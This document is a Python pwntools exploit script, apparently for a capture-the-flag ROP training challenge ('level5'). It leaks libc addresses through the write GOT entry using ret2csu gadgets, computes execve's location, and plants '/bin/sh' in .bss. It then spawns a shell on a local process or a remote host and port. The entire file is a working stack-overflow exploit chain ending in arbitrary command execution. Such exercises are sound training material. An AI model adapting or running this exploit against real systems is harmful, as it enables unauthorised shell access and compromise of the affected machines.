from pwn import *
from misc import *

local = 1
bit_num = 64

if bit_num == 32:
    context(os='linux', arch='i386', log_level='info')
else:
    context(os='linux', arch='amd64', log_level='info')

if __name__ == "__main__":
    addr = '../../challenges/ROP_STEP_BY_STEP/linux_x64/level5'
    ip = '111.200.241.244:65037'
    r = None
    if not local:
        r = remote(ip.split(':')[0], int(ip.split(':')[1]))
    else:
        r = process([addr])

    elf = ELF(addr)
    write_plt = elf.plt['write']
    write_got = elf.got['write']
    read_got = elf.got['read']
    main_addr = elf.symbols['main']
    bss_base = elf.bss()
    csu_front_addr = 0x4005F0
    csu_end_addr = 0x400606

    output = b''

    # first stack address = rsp + 8, so we need deadbeef
    payload = csu(136, csu_end_addr, 0, 1, write_got, 1, write_got, 8, csu_front_addr, main_addr)
    output += payload + b'\n'
    # write_bins(payload, './level5_poc')

    r.sendlineafter(b'Hello, World\n', payload)
    write_addr = u64(r.recv(8))  # 090
    print(hex(write_addr))

    # libc6_2.31-0ubuntu9.7_amd64
    base = write_addr - 0x10e090
    execve_addr = base + 0xe31a0

    payload = csu(136, csu_end_addr, 0, 1, read_got, 0, bss_base, 16, csu_front_addr, main_addr)
    output += payload + b'\n'
    r.sendlineafter(b'Hello, World\n', payload)

    payload = p64(execve_addr) + b'/bin/sh\x00'
    output += payload + b'\n'
    r.send(payload)

    payload = csu(136, csu_end_addr, 0, 1, bss_base, bss_base + 8, 0, 0, csu_front_addr, main_addr)
    output += payload + b'\n'
    r.sendlineafter(b'Hello, World\n', payload)

    write_bins(output, 'level5_poc')
    r.interactive()
